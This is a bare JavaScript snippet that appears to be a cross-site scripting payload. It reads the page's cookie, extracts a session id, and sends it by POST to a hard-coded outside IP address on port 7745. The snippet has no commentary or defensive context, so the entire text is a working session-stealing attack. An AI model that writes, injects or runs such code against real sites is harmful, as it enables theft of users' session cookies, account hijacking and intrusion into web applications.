var sessionid = document.cookie.split('=')[1]+".";

var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://121.91.173.139:7745/send');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseText);
  }
};

xhr.send('header=fdsafdsa&listener=admin123123&content='+sessionid);
